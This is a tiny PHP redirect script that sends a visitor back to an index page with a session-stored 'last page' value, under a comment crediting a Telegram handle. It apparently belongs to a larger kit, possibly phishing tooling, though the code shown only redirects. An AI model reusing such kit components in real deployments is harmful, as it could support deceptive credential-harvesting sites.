<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    require_once 'app/config.php';
    $red = $_SESSION['last_page'];
    header("Location: ../index.php?redirection=$red");
    exit();
?>